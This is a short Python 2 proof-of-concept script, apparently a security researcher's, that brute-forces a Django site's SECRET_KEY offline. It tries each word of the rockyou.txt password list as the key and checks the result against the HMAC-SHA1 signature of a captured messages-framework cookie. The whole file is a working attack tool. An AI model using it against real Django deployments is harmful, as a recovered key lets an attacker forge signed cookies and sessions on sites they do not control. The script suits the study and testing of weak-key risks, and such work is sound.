import hashlib
import hmac

def force_bytes(s, encoding='utf-8', strings_only=False, errors='strict'):
    return s.encode(encoding, errors)

print "Django Secret Key Finder Example"
print "   Luke Arntson PoC 4.14.2016"
    
key_salt = force_bytes('django.contrib.messages')
message = force_bytes('[[\"__json_message\"\0540\05420\054\"Hello World\"]]')
hash = "05b3f8749c628bb9690c74632271b4af269ff6b2"

f = open('rockyou.txt', 'r')
words = f.read().split('\n')
for word in words:
    try:
        if hmac.new(hashlib.sha1(key_salt + force_bytes(word)).digest(),
                        msg=message, digestmod=hashlib.sha1).hexdigest() == hash:
            print "Found it! Secret key: " + word
            break
    except:
        pass